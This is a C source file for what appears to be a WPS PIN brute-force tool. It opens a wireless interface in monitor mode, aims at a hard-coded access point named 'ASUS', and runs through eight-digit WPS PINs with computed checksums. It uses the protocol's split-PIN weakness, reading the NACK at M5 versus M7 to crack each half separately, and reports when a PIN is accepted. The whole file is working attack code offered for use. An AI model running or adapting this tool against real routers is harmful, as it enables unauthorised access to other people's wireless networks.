#include "WPS/wps_transaction.h"
#include "helpers.h"
#include <pcap.h>
#include <stdio.h>
#include <time.h>

int ComputeChecksum(unsigned long int PIN) {
  unsigned long int accum = 0;
  PIN *= 10;
  accum += 3 * ((PIN / 10000000) % 10);
  accum += 1 * ((PIN / 1000000) % 10);
  accum += 3 * ((PIN / 100000) % 10);
  accum += 1 * ((PIN / 10000) % 10);
  accum += 3 * ((PIN / 1000) % 10);
  accum += 1 * ((PIN / 100) % 10);
  accum += 3 * ((PIN / 10) % 10);
  int digit = (accum % 10);
  return (10 - digit) % 10;
}

int main(int argc, char *argv[]) {
  // config
  char targetssid[] = "ASUS";
  char iface[] = "wlan0";
  uint32_t pin = 0;
  uint8_t wpspin[8];
  uint8_t state = 0;
  uint8_t retry = 0;
  clock_t start, end;
  time_t start_r;
  double cpu_time_used, real_time_used;
  uint32_t tries = 0;
  uint32_t pins = 0;
  // vars
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t *handle;
  int ret;
  MAC *mymac = getMAC(); // get own MAC Adress

  // open handle
  handle = pcap_open_live(iface, 65536, 0, 0, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "Couldn't open device %s: %s\n", iface, errbuf);
    return (1);
  }

  // check monitormode
  if (pcap_can_set_rfmon(handle) != 0) {
    fprintf(stderr, "Monitor mode can not be enabled. is device already in "
                    "monitor mode?.\n");
    return 1;
  }

  // check if we have the right Datalink
  if (pcap_datalink(handle) != 127) {
    fprintf(stderr, "Wrong Datalink Type.\n");
    return 1;
  }
  printf("First Pin: %07lu checksum: %d\n", pin, ComputeChecksum(pin));
  start = clock();
  start_r = time(NULL);
  while (state != 2) {
    if (pin > 9999999)
      exit(2);
    tries++;
    sprintf((char *)wpspin, "%07lu%d", pin, ComputeChecksum(pin));
    ret = doexchange(handle, targetssid, wpspin, mymac);
    switch (ret) {
    case -1:
      printf("Pin OK, but no key found!\n");
      exit(1);
      break;
    case 0:
      printf("Pin OK\n");
      exit(0);
      break;
    case 1:
      printf("Timeout\n");
      retry = 1;
      break;
    case 2:
      printf("WSC_NACK instead of M3. This should not happen!\n");
      break;
    case 3:
      printf("WSC_NACK instead of M5\n");
      pins++;
      break;
    case 4:
      printf("WSC_NACK instead of M7\n");
      pins++;
      state = 1;
      break;
    default:
      printf("Something somewhere went horribly wrong!\n");
      break;
    }
    if (tries % 10 == 0) {
      end = clock();
      cpu_time_used = ((double)(end - start)) / CLOCKS_PER_SEC;
      real_time_used = (double)(time(NULL) - start_r);
      printf("\n\tTime: %.2f, Pins: %d, %.2f s/pin(CPU), %.2f s/pin(Real)\n\n",
             real_time_used, pins, cpu_time_used / pins, real_time_used / pins);
    }
    if (retry == 0) {
      if (state == 0)
        pin += 1000;
      else
        pin++;
    } else {
      printf("re");
      retry = 0;
    }
    usleep(500000);
  }

  pcap_close(handle);

  return (0);
}
